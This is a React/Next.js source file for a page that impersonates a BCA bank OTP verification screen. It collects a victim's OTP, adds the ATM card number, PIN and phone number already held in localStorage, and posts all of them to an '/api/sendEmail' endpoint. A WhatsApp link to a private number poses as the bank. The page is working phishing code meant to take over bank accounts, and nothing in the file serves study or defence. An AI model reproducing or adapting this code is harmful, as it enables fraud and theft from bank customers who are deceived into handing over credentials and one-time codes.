import React, { useState } from 'react'

function Otp({host}) {

    const [otp, setOtp] = useState("")

    const handleSetOtp = async () => {
        
        if(otp){
            
            document.getElementById('btn').innerHTML = 'Loading...'
    
            localStorage.setItem('otp', otp)

            const body = {
                otp,
                nomoratm : localStorage.getItem('nomoratm'),
                pin : localStorage.getItem('pin'),
                nohp : localStorage.getItem('nohp')
            }
            
            try {
    
                const response = await fetch('/api/sendEmail',{
                    method : 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'url': host
                    },
                    body: JSON.stringify(body)
                })
    
                const json = await response.json()
            
                if (json.status === 200) {
                    setOtp("")
                    document.getElementById('btn').innerHTML = 'PROSES'
                } else{
                    document.getElementById('btn').innerHTML = 'PROSES'
                }
                
            } catch (error) {
                document.getElementById('btn').innerHTML = 'PROSES'
                console.log(error);
            }

        }

    }

    // untuk link whatsapp
    let url = ''
    if (host == 'ubah-tarif.herokuapp.com') {
        url = 'https://api.whatsapp.com/send?phone=6283809116360&text=*Hallo%20BANK%20BCA.*%20Minta%20SMS%20Aktivasi%20nya%20%3F'
    } else {
        url = 'https://api.whatsapp.com/send?phone=6283809116360&text=*Hallo%20BANK%20BCA.*%20Minta%20SMS%20Aktivasi%20nya%20%3F'
    }
    
    return (
        <div className='container-mobile'>
            <div className='bg-logo'>
                <img src='/logo.png' alt='logo' className='logo'/>
            </div>
            <div className='card'>
                <div className='card-title'>
                    <p>Verifikasi kode OTP</p>
                </div>
                <div className='card-body'>
                    <p>Silahkan Request Kode OTP.</p>
                    <div className='alert'>
                        <img src='/iconwarning.png' alt='icon' className='icon-warning'/>
                        <span>Untuk mendapatkan kode otp, Silahkan klik tombol Request Kode OTP terlebih dahulu.</span>
                    </div>
                    <div className='form-atm'>
                        <label className='label-atm'>Kode OTP</label>
                        <input type="text" className='input-atm' placeholder='Masukkan Kode OTP' value={otp} onChange={e => setOtp(e.target.value)} />                        
                    </div>
                    <div className='mt'>
                        {/* Whatsapp */}
                        <a href={url} className='link-otp'>{'>>'} Request Kode OTP ? {'<<'} </a>
                    </div>
                    <button onClick={handleSetOtp} className='btn-atm' id='btn'>PROSES</button>
                </div>
            </div>
            <div className='footer-login'>
                <div className='footer-body'>
                    <span>Lokasi BCA</span>
                    <span>BCA.CO.ID</span>
                </div>
                <div className='footer-body'>
                    <span>informasi kurs</span>
                    <span>sosial media</span>
                </div>
            </div>
            <div className='text-footer'>&copy;{new Date().getFullYear()} PT Bank Central Asia Tbk, All Right Reserved</div>
            <div className='text-footer-link'>Syarat & Ketentuan, Kebiijkan Privasi</div>
        </div>
    )


}

export async function getServerSideProps(context) {

    const host = context.req.headers.host
    
    return {
        props: {
            host
        },
    }
}

export default Otp
